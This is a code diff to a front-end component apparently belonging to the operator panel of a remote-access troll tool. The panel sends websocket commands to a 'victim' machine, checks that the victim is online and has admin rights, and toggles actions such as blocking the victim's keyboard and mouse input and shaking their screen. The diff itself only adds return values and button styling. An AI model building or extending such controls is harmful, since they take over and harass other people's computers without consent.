@@ -156,13 +156,25 @@ export function RoflSection() {
       const onBlockOn = () => {
          if (!ensureWs()) return;
          if (!ensureVictimAdmin()) return;
-         sendCommand("block_input_on");
+         const ok = sendCommand("block_input_on", "Block input: ON");
+         if (!ok) return;
+         try {
+            blockOnBtn?.classList.add("active");
+            blockOffBtn?.classList.remove("active");
+         } catch {
+         }
       };
 
       const onBlockOff = () => {
          if (!ensureWs()) return;
          if (!ensureVictimAdmin()) return;
-         sendCommand("block_input_off");
+         const ok = sendCommand("block_input_off", "Block input: OFF");
+         if (!ok) return;
+         try {
+            blockOffBtn?.classList.add("active");
+            blockOnBtn?.classList.remove("active");
+         } catch {
+         }
       };
 
       const onBg = () => {
@@ -188,16 +200,16 @@ export function RoflSection() {
       };
 
       const sendSwapCommand = (cmd: string, successText: string) => {
-         if (!ensureWs()) return;
-         if (!ensureVictimOnline()) return;
-         sendCommand(cmd, successText);
+         if (!ensureWs()) return false;
+         if (!ensureVictimOnline()) return false;
+         return sendCommand(cmd, successText);
       };
 
       const sendSimpleRoflCommand = (cmd: string, successText: string) => {
          const now = Date.now();
          if (now < roflFloodUntil) {
             showToast("error", "Don't flood");
-            return;
+            return false;
          }
          if (!roflWindowStart || now - roflWindowStart > 3000) {
             roflWindowStart = now;
@@ -207,12 +219,12 @@ export function RoflSection() {
          if (roflCmdCount > 5) {
             roflFloodUntil = now + 10000;
             showToast("error", "Don't flood");
-            return;
+            return false;
          }
 
-         if (!ensureWs()) return;
-         if (!ensureVictimOnline()) return;
-         sendCommand(cmd, successText);
+         if (!ensureWs()) return false;
+         if (!ensureVictimOnline()) return false;
+         return sendCommand(cmd, successText);
       };
 
       openBtn.addEventListener("click", onOpen);
@@ -242,12 +254,24 @@ export function RoflSection() {
       }
       if (shakeOnBtn) {
          shakeOnBtn.addEventListener("click", () => {
-            sendSimpleRoflCommand("shake_on", "Shake screen: ON command sent");
+            const ok = sendSimpleRoflCommand("shake_on", "Shake screen: ON");
+            if (!ok) return;
+            try {
+               shakeOnBtn.classList.add("active");
+               shakeOffBtn?.classList.remove("active");
+            } catch {
+            }
          });
       }
       if (shakeOffBtn) {
          shakeOffBtn.addEventListener("click", () => {
-            sendSimpleRoflCommand("shake_off", "Shake screen: OFF command sent");
+            const ok = sendSimpleRoflCommand("shake_off", "Shake screen: OFF");
+            if (!ok) return;
+            try {
+               shakeOffBtn.classList.add("active");
+               shakeOnBtn?.classList.remove("active");
+            } catch {
+            }
          });
       }
 
